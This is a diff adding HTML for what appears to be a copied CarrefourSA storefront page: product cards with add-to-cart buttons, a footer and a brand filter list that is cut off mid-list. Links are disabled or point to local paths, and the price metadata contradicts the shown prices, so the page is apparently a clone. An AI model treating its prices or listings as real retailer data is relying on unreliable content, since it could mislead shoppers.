+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle50" onclick="SepeteEkle(50)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor50" onclick="SepeteEkle(50)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim50" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=66">
+         <span class="thumb">
+          <img alt="Baymak Elegant Eco 18000 Btu A++Inverter Klima" data-loadedx="false" data-src="https://reimg-carrefour.mncdn.com/mnresize/600/600/productimage/30492670/30492670_0_MC/8867776888882_1748937861331.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://reimg-carrefour.mncdn.com/mnresize/600/600/productimage/30492670/30492670_0_MC/8867776888882_1748937861331.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Baymak Elegant Eco 18000 Btu A++Inverter Klima
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          38.999,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle66" onclick="SepeteEkle(66)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor66" onclick="SepeteEkle(66)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim66" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=67">
+         <span class="thumb">
+          <img alt="Carrefour Ayçiçek Yağı Pet 2x5 Lt" data-loadedx="false" data-src="https://reimg-carrefour.mncdn.com/mnresize/600/600/productimage/30078961/30078961_0_MC/8796820406322_1702040953817.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://reimg-carrefour.mncdn.com/mnresize/600/600/productimage/30078961/30078961_0_MC/8796820406322_1702040953817.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Carrefour Ayçiçek Yağı Pet 2x5 Lt
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          439,99 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle67" onclick="SepeteEkle(67)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor67" onclick="SepeteEkle(67)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim67" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=68">
+         <span class="thumb">
+          <img alt="Altus AL 403 MP E Enerji Bulaşık Makinesi" data-loadedx="false" data-src="https://reimg-carrefour.mncdn.com/mnresize/600/600/productimage/30383788/30383788_0_MC/8840413118514_1648803448331.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://reimg-carrefour.mncdn.com/mnresize/600/600/productimage/30383788/30383788_0_MC/8840413118514_1648803448331.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Altus AL 403 MP E Enerji Bulaşık Makinesi
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          12.999,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle68" onclick="SepeteEkle(68)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor68" onclick="SepeteEkle(68)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim68" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <div class="footer-top-container">
+    <div class="container">
+     <div class="footer-top-inner">
+      <a class="footer-top-item" href="javascript:void(0);">
+       <img alt="Mağazalarımız" decoding="async" loading="lazy" src="https://reimg-carrefour.mncdn.com/staticimage/csa-store-icon.svg" width="33px"/>
+       <span>
+        Mağazalarımız
+       </span>
+      </a>
+      <a class="footer-top-item" href="javascript:void(0);">
+       <img alt="Bayilik Başvuru Formu" decoding="async" loading="lazy" src="https://reimg-carrefour.mncdn.com/staticimage/csa-dealership-icon.svg" width="33px"/>
+       <span>
+        Bayilik Başvuru Formu
+       </span>
+      </a>
+      <a class="footer-top-item" href="javascript:void(0);">
+       <img alt="Kiralık Yeriniz mi Var?" decoding="async" loading="lazy" src="https://reimg-carrefour.mncdn.com/staticimage/csa-placerent-icon.svg" width="33px"/>
+       <span>
+        Kiralık Yeriniz mi Var?
+       </span>
+      </a>
+      <a class="footer-top-item" href="javascript:void(0);">
+       <img decoding="async" loading="lazy" src="https://reimg-carrefour.mncdn.com/staticimage/lezzet_arasi_logo.png" width="80px"/>
+       <span>
+        Lezzet Arası
+       </span>
+      </a>
+      <div class="footer-top-telephone">
+       444 1 000
+      </div>
+     </div>
+    </div>
+   </div>
+   <footer class="main-footer">
+    <span class="close-footer-modal active">
+     <i class="close-modal-icon">
+     </i>
+    </span>
+    <span class="back-footer-modal">
+     <i class="back-modal-icon">
+     </i>
+    </span>
+    <div class="footer-grid-area">
+     <div class="container helperlinks-container">
+      <div class="col-md-9">
+       <div class="footer-grid">
+        <div class="links">
+         <div class="f-link-block">
+          <div class="link-title">
+           <div class="title">
+            İŞLEM REHBERİ
+           </div>
+           <span class="glyphicon glyphicon-menu-right">
+           </span>
+          </div>
+          <ul>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Sipariş Verme">
+             Sipariş Verme
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Ödeme">
+             Ödeme
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Teslimat">
+             Teslimat
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Sipariş İptali">
+             Sipariş İptali
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Sipariş Erteleme">
+             Sipariş Erteleme
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Fatura Bulucu">
+             Fatura Bulucu
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="links">
+         <div class="f-link-block">
+          <div class="link-title">
+           <div class="title">
+            MÜŞTERİ HİZMETLERİ
+           </div>
+           <span class="glyphicon glyphicon-menu-right">
+           </span>
+          </div>
+          <ul>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Sizi Dinliyoruz">
+             Sizi Dinliyoruz
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" rel="noopener noreferrer" title="Mağazalarımız">
+             Mağazalarımız
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Sıkça Sorulan Sorular">
+             Sıkça Sorulan Sorular
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Kiralık Yeriniz mi Var?">
+             Kiralık Yeriniz mi Var?
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="İletişim">
+             İletişim
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="links">
+         <div class="f-link-block">
+          <div class="link-title">
+           <div class="title">
+            KURUMSAL SATIŞ
+           </div>
+           <span class="glyphicon glyphicon-menu-right">
+           </span>
+          </div>
+          <ul>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Hediye Kod">
+             Hediye Kod
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Hediye Kart">
+             Hediye Kart
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Online Kurumsal Kod">
+             Online Kurumsal Kod
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Kurumsal Kart">
+             Kurumsal Kart
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Kurumsal Ürün Sorgulama">
+             Kurumsal Ürün Sorgulama
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Esnek Kart / Kod">
+             Esnek Kart / Kod
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Alternatif Ödeme Sistemleri">
+             Alternatif Ödeme Sistemleri
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="links">
+         <div class="f-link-block">
+          <div class="link-title">
+           <div class="title">
+            İADE VE DEĞİŞİM KOŞULLARI
+           </div>
+           <span class="glyphicon glyphicon-menu-right">
+           </span>
+          </div>
+          <ul>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Market Alışverişlerinde">
+             Market Alışverişlerinde
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="İnternet Alışverişlerinde">
+             İnternet Alışverişlerinde
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="links">
+         <div class="f-link-block">
+          <div class="link-title">
+           <div class="title">
+            KİŞİSEL VERİLERİN KORUNMASI
+           </div>
+           <span class="glyphicon glyphicon-menu-right">
+           </span>
+          </div>
+          <ul>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Çerez Aydınlatma Metni">
+             Çerez Aydınlatma Metni
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="İnternet Sitesi Ziyaretçilerine Yönelik Aydınlatma Metni">
+             İnternet Sitesi Ziyaretçilerine Yönelik Aydınlatma Metni
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Üye Aydınlatma Metni">
+             Üye Aydınlatma Metni
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Bayi Aydınlatma Metni">
+             Bayi Aydınlatma Metni
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="CarrefourSA Destek Aydınlatma Metni">
+             CarrefourSA Destek Aydınlatma Metni
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="İletişim Aydınlatma Metni">
+             İletişim Aydınlatma Metni
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Kiralık Yer Aydınlatma Metni">
+             Kiralık Yer Aydınlatma Metni
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Whatsapp Aydınlatma Metni">
+             Whatsapp Aydınlatma Metni
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="İlgili Kişi Başvuru Formu">
+             İlgili Kişi Başvuru Formu
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Kurban Satışı Aydınlatma Metni">
+             Kurban Satışı Aydınlatma Metni
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="links">
+         <div class="f-link-block">
+          <div class="link-title">
+           <div class="title">
+            POLİTİKA ve PROSEDÜRLER
+           </div>
+           <span class="glyphicon glyphicon-menu-right">
+           </span>
+          </div>
+          <ul>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Gizlilik İlkeleri">
+             Gizlilik İlkeleri
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Kullanım Şartları">
+             Kullanım Şartları
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Güvenli Ödeme">
+             Güvenli Ödeme
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="links">
+         <div class="f-link-block">
+          <div class="link-title">
+           <div class="title">
+            KURUMSAL
+           </div>
+           <span class="glyphicon glyphicon-menu-right">
+           </span>
+          </div>
+          <ul>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="CarrefourSA Hakkında">
+             CarrefourSA Hakkında
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Kurumsal/Yatırımcı İlişkileri">
+             Kurumsal/Yatırımcı İlişkileri
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Bayilik Başvuru Formu">
+             Bayilik Başvuru Formu
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Kurumsal Marka Kullanımı">
+             Kurumsal Marka Kullanımı
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Hakkımızda">
+             Hakkımızda
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="Bilgi Toplumu Hizmetleri">
+             Bilgi Toplumu Hizmetleri
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="İnsan Kaynakları">
+             İnsan Kaynakları
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a href="javascript:void(0);" title="CarrefourSA Tescilli Markalar">
+             CarrefourSA Tescilli Markalar
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="links">
+         <div class="f-link-block">
+          <div class="link-title">
+           <div class="title">
+            SOSYAL
+           </div>
+           <span class="glyphicon glyphicon-menu-right">
+           </span>
+          </div>
+          <ul>
+           <li class="yCmsComponent">
+            <a class="facebookIcon" href="javascript:void(0);" title="Facebook">
+             Facebook
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a class="youTubeIcon" href="javascript:void(0);" title="YouTube">
+             YouTube
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a class="twitterIcon" href="javascript:void(0);" title="Twitter">
+             Twitter
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a class="linkedInIcon" href="javascript:void(0);" title="LinkedIn">
+             LinkedIn
+            </a>
+           </li>
+           <li class="yCmsComponent">
+            <a class="instagramIcon" href="javascript:void(0);" title="Instagram">
+             Instagram
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="col-md-3 footer-right">
+       <div class="links">
+        <div class="f-link-block mobile-applications">
+         <div class="title">
+          <div class="content">
+           <div class="cookiespool-hidden" id="cookiespool-shadow-background">
+           </div>
+           <div class="apps-box-title">
+            Uygulamalar:
+           </div>
+          </div>
+         </div>
+         <div class="csa-mobile-app-img">
+          <img decoding="async" height="75" loading="lazy" src="https://reimg-carrefour.mncdn.com/staticimage/carrefoursa-mobile-app-img2x.png" width="106"/>
+         </div>
+         <div class="apps-box">
+          <div class="content">
+           <div class="apps-icon-box">
+            <a class="android-icon" href="javascript:void(0);">
+             Carrefoursa Android Uygulaması
+            </a>
+           </div>
+          </div>
+          <div class="content">
+           <div class="apps-icon-box">
+            <a class="ios-icon" href="javascript:void(0);">
+             Carrefoursa iOS Application
+            </a>
+           </div>
+          </div>
+          <div class="content">
+           <div class="apps-icon-box">
+            <a class="huawei-icon" href="javascript:void(0);">
+             Carrefoursa Huawei Uygulaması
+            </a>
+           </div>
+          </div>
+         </div>
+         <div class="title social-title">
+          Bizi Takip Edin
+         </div>
+         <div class="social-box">
+          <div>
+           <a class="facebookIcon" href="javascript:void(0);" title="Facebook">
+            Facebook
+           </a>
+          </div>
+          <div>
+           <a class="youTubeIcon" href="javascript:void(0);" title="YouTube">
+            YouTube
+           </a>
+          </div>
+          <div>
+           <a class="twitterIcon" href="javascript:void(0);" title="Twitter">
+            Twitter
+           </a>
+          </div>
+          <div>
+           <a class="linkedInIcon" href="javascript:void(0);" title="LinkedIn">
+            LinkedIn
+           </a>
+          </div>
+          <div>
+           <a class="instagramIcon" href="javascript:void(0);" title="Instagram">
+            Instagram
+           </a>
+          </div>
+         </div>
+         <div>
+          <div class="content">
+           <div>
+            <div class="title">
+             Kataloglar
+            </div>
+            <div class="row">
+             <a class="catalog-button" href="javascript:void(0);">
+              <i class="csa-catalog-icon">
+              </i>
+              <span>
+               CarrefourSA Katalog
+              </span>
+             </a>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div>
+          <div class="content">
+           <div class="credit-cards-logos">
+            <img height="50px" src="https://reimg-carrefour.mncdn.com/staticimage/payment-logos-2.svg" width="200px"/>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class="footer-bottom">
+     <div class="footer-bottom-container">
+      <div class="footer-logos">
+       <div class="sabanci-logo">
+       </div>
+      </div>
+      <div class="footer-copyright">
+       © Copyright 2025 CarrefourSA Carrefour Sabancı Ticaret Merkezi A.Ş.
+      </div>
+     </div>
+    </div>
+   </footer>
+  </main>
+  <form name="accessiblityForm">
+  </form>
+  <div aria-live="polite" aria-relevant="text" class="skip" id="ariaStatusMsg" role="status">
+  </div>
+  <div class="variantOverlay">
+  </div>
+  <!-- MOBİL FİLTRE-->
+  <div id="cboxOverlay" style="opacity: 0.7; cursor: pointer; visibility: visible; display: none;">
+  </div>
+  <div class="filter-css" id="colorbox" role="dialog" style="display: none; visibility: visible; top: 0px; left: 0px; position: absolute; width: 430px; height: 932px;" tabindex="-1">
+   <div id="cboxWrapper">
+    <div>
+     <div id="cboxTopLeft" style="float: left;">
+     </div>
+     <div id="cboxTopCenter" style="float: left; width: 402px;">
+     </div>
+     <div id="cboxTopRight" style="float: left;">
+     </div>
+    </div>
+    <div style="clear: left;">
+     <div id="cboxMiddleLeft" style="float: left; height: 875px;">
+     </div>
+     <div class="category-mobile-filter-modal" id="cboxContent" style="float: left; position: fixed; width: 402px; height: 875px;">
+      <div id="cboxLoadedContent" style="width: 382px; overflow: auto; height: 100%;">
+       <div class="product-facet js-product-facet js-mobile-product-facet">
+        <div class="facet js-facet js-mobile-facet other-facets">
+         <div class="facet-name js-facet-name" id="markamobilbuton" onclick="document.getElementById('markalarmobil').style.display = 'block'; document.getElementById('markamobilbuton').style.display = 'none'; document.getElementById('head1').style.display = 'none'; document.getElementById('head2').style.display = 'block';">
+          Marka
+          <span class="glyphicon glyphicon-menu-right js-mobile-filter-accordion" style="float: right; margin-right: 8px;">
+          </span>
+         </div>
+         <div class="facet-values js-facet-values js-facet-form" id="markalarmobil" style="max-height: 100% !important; height: 100% !important; display: none;">
+          <ul class="facet-list js-facet-list">
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Stanley">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Stanley" rel="nofollow">
+                Stanley
+               </a>
+               <a href="/?filtre=Stanley">
+                Stanley
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Philips">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Philips" rel="nofollow">
+                Philips
+               </a>
+               <a href="/?filtre=Philips">
+                Philips
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Fissler">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Fissler" rel="nofollow">
+                Fissler
+               </a>
+               <a href="/?filtre=Fissler">
+                Fissler
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Beko">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Beko" rel="nofollow">
+                Beko
+               </a>
+               <a href="/?filtre=Beko">
+                Beko
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Samsung">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Samsung" rel="nofollow">
+                Samsung
+               </a>
+               <a href="/?filtre=Samsung">
+                Samsung
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Bosch">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Bosch" rel="nofollow">
+                Bosch
+               </a>
+               <a href="/?filtre=Bosch">
+                Bosch
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Xiaomi">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Xiaomi" rel="nofollow">
+                Xiaomi
+               </a>
+               <a href="/?filtre=Xiaomi">
+                Xiaomi
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Apple">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Apple" rel="nofollow">
+                Apple
+               </a>
+               <a href="/?filtre=Apple">
+                Apple
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Lenovo">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Lenovo" rel="nofollow">
+                Lenovo
+               </a>
+               <a href="/?filtre=Lenovo">
+                Lenovo
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=DYSON">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=DYSON" rel="nofollow">
+                DYSON
+               </a>
+               <a href="/?filtre=DYSON">
+                DYSON
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Volta">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Volta" rel="nofollow">
+                Volta
+               </a>
+               <a href="/?filtre=Volta">
+                Volta
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Huawei">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Huawei" rel="nofollow">
+                Huawei
+               </a>
+               <a href="/?filtre=Huawei">
+                Huawei
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Karaca ">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Karaca " rel="nofollow">
+                Karaca
+               </a>
+               <a href="/?filtre=Karaca ">
+                Karaca
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=POCO">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=POCO" rel="nofollow">
+                POCO
+               </a>
+               <a href="/?filtre=POCO">
+                POCO
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Seg">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Seg" rel="nofollow">
+                Seg
+               </a>
+               <a href="/?filtre=Seg">
+                Seg
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=BAYMAK">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=BAYMAK" rel="nofollow">
+                BAYMAK
+               </a>
+               <a href="/?filtre=BAYMAK">
+                BAYMAK
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=Carrefour">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=Carrefour" rel="nofollow">
+                Carrefour
+               </a>
+               <a href="/?filtre=Carrefour">
+                Carrefour
+               </a>
+              </span>
+             </span>
+            </label>
+           </li>
+           <li>
+            <label>
+             <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+             <span class="facet-label">
+              <a href="/?filtre=ALTUS">
+               <span class="facet-mark">
+               </span>
+              </a>
+              <span class="facet-text">
+               <a class="brand-capitalize-name" hidden="true" href="/?filtre=ALTUS" rel="nofollow">
+                ALTUS
+               </a>
